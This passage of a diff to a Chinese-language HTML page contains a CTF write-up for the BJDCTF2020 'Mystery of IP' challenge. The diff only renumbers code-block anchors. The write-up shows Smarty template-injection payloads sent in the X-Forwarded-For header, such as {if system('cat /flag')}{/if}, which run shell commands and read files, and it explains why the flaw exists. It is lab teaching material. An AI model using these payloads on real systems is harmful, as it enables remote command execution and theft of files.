-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="x">if (phpinfo()) { }</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x">// {if phpinfo()}{/if}  编译后大致是：</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="x">if (phpinfo()) { }</span>
 </span></code></pre></div>
 <p><strong>所以先验证这条路通不通：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>X-Forwarded-For: {if phpinfo()}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>X-Forwarded-For: {if phpinfo()}{/if}
 </span></code></pre></div>
 <p><strong>成功返回了 phpinfo 页面。</strong></p>
 <h4 id="step-6"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-6">Step 6：先看环境，再读文件</a></h4>
 <p><strong>phpinfo 里翻两件事：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>disable_functions   →  空        （system / exec 都没禁）
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>open_basedir        →  没设      （没有被限制目录）
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>disable_functions   →  空        （system / exec 都没禁）
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>open_basedir        →  没设      （没有被限制目录）
 </span></code></pre></div>
 <p><strong>顺手看了环境变量，只有一个 <code>FLAG=not_flag</code>：</strong></p>
 <p><img alt="环境变量" src="../../../assets/images/bjdctf2020-mystery-ip/02-env-not-flag.png" /></p>
 <p><strong>这是干扰项，别信。</strong></p>
 <h4 id="step-7"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-7">Step 7：执行命令</a></h4>
 <p><strong>注意 <code>{if}</code> 只判断真假，不打印值。所以要挑"自己会 echo 出来"的函数。<code>system</code> 属于这类。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>X-Forwarded-For: {if system('ls /')}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>X-Forwarded-For: {if system('ls /')}{/if}
 </span></code></pre></div>
 <p><img alt="列根目录" src="../../../assets/images/bjdctf2020-mystery-ip/03-ls-root.png" /></p>
 <p><strong>根目录下有个 <code>flag</code>。</strong></p>
 <h4 id="step-8"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#step-8">Step 8：读出来</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>X-Forwarded-For: {if system('cat /flag')}{/if}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>X-Forwarded-For: {if system('cat /flag')}{/if}
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
-</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
-</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
-</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>      → 报错里的 smarty_internal_*.php 印证
-</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
-</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
-</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>            → 看 disable_functions / open_basedir → 都没限制
-</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>              → {if system('ls /')}{/if} 看到 /flag
-</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>                → {if system('cat /flag')}{/if} 拿到 flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → 报错里的 smarty_internal_*.php 印证
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>            → 看 disable_functions / open_basedir → 都没限制
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>              → {if system('ls /')}{/if} 看到 /flag
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>                → {if system('cat /flag')}{/if} 拿到 flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_4">漏洞原理</a></h4>
 <p><strong>① 输入来源不只是参数，还有请求头</strong></p>
@@ -4492,8 +4492,8 @@
 <p><strong>② 模板引擎把"表达式"编译成代码</strong></p>
 <p>Smarty 把 <code>{if 表达式}</code> 编译成 PHP 的 <code>if (表达式)</code>。<strong>只要表达式里允许出现函数调用，就等于允许执行 PHP 函数。</strong>这和 Jinja 的 <code>{{ }}</code> 能访问对象属性是同一类问题的不同表现。</p>
 <p><strong>③ <code>{if}</code> 只判真假，不打印值</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="x">if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到</span>
-</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="x">if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白</span>
 </span></code></pre></div>
 <p><strong>所以要选"会输出"的函数</strong>（<code>phpinfo</code>、<code>system</code>、<code>readfile</code>、<code>print</code>），或者把返回值再套一层输出函数。</p>
 <h4 id="_5"><a class="toclink" href="../../bjdctf2020-mystery-of-ip-smarty/#_5">关键知识点</a></h4>
